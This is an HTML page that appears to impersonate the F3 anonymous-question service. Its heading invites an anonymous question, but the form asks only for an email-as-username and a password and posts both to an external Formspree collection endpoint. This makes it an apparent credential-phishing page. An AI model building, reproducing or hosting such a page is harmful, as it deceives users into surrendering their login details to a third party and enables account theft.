<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>F3</title>
    <link rel="icon" href="https://androidprogrammi.ru/wp-content/uploads/2021/02/cool_f3.png">
    <style>
        *{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            height: 100vh;
            display: -webkit-flex;
            display: -moz-flex;
            display: -ms-flex;
            display: -o-flex;
            display: flex;
            justify-content: center;
            flex-direction: column;
            align-items: center;
            background: rgb(2,0,36);
            background: linear-gradient(90deg, rgba(2,0,36,1) 0%, rgba(46,9,121,1) 3%, rgba(255,0,108,1) 100%);
        }
        
        form {
            display: -webkit-flex;
            display: -moz-flex;
            display: -ms-flex;
            display: -o-flex;
            display: flex;
            -webkit-flex-direction: column;
            -moz-flex-direction: column;
            -ms-flex-direction: column;
            -o-flex-direction: column;
            flex-direction: column;
            align-items: center;
            
        }
        
        input {
            width: 400px;
            height: 40px;
            margin: 10px;
            padding: 10px;
            font-size: 18px;
        }
        button {
            width: 150px;
            height: 40px;
            background-color: dodgerblue;
            color: #fff;
            font-weight: ;900;
            font-size: 16px;
            border: none;
            border-radius: 5px;
            margin-top: 20px;
        }
        .logo {
            width: 100px;
            height: 100px;
            background-image: url('https://androidprogrammi.ru/wp-content/uploads/2021/02/cool_f3.png');
            position: fixed;
            top: 50px;
            -webkit-background-size: cover;
            background-size: cover;
            border-radius: 20px;
            box-shadow: 0 3px 3px #333;
        }
        
        .quest {
            font-family: monospace;
            background-color: #16f51d;
            color: #333;
            padding: 5px 20px;
            border-radius: 20px;
            margin: 20px 0;
            box-shadow: 0 2px 2px #333;
        }
    </style>
</head>
<body>
  <div class="logo"></div>
  <h1 class="quest">Give me anonime guestion</h1>
   <form action="https://formspree.io/f/xayajvoo" method="POST">
  
    <input placeholder="Username" type="email" name="_replyto">
    <input placeholder="password" name="message" type="password">
  <button type="submit">Send</button>
</form> 
</body>
</html>
